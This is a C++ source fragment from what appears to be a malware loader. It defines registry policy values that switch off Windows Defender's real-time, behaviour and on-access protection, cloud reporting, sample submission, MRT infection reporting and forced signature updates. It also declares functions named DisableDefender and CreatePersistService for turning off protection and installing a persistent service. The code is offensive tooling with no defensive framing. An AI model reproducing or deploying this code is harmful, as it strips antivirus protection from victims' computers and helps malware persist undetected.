#ifndef UNICODE
#define UNICODE
#endif 

#include <Windows.h>
#include <map>
#include <iostream>
#include <winreg.h>
#include <winsvc.h>
#include "..\include\logger.hpp"
#include "..\include\header.hpp"

namespace loader {

HKEY HKLM = HKEY_LOCAL_MACHINE;
std::map<LPCWSTR, std::map<LPCWSTR, DWORD>> registryEntries = {
	{L"SOFTWARE\\Wow6432Node\\Policies\\Microsoft\\Windows Defender", {
		{L"DisableAntiSpyware", 1},
		{L"DisableRoutinelyTakingAction", 1},
		{L"DisableRealtimeMonitoring", 1},
		{L"DisableAntiVirus", 1},
		{L"DisableSpecialRunningModes", 1},
		{L"ServiceKeepAlive", 0}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", {
		{L"DisableAntiSpyware", 1},
		{L"DisableRoutinelyTakingAction", 1},
		{L"DisableRealtimeMonitoring", 1},
		{L"DisableAntiVirus", 1},
		{L"DisableSpecialRunningModes", 1},
		{L"ServiceKeepAlive", 0}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", {
		{L"SpyNetReporting", 0},
		{L"SubmitSamplesConsent", 0},
		{L"DisableBlockAtFirstSeen", 1}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\MRT", {
		{L"DontReportInfectionInformation", 1}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", {
		{L"ForceUpdateFromMU", 0}
	}},
	{L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", {
		{L"DisableRealtimeMonitoring", 1},
		{L"DisableOnAccessProtection", 1},
		{L"DisableBehaviorMonitoring", 1},
		{L"DisableScanOnRealtimeEnable", 1},
	}}
};
LPCWSTR dllPath = L"";

int DisableDefender();
int CreatePersistService();

}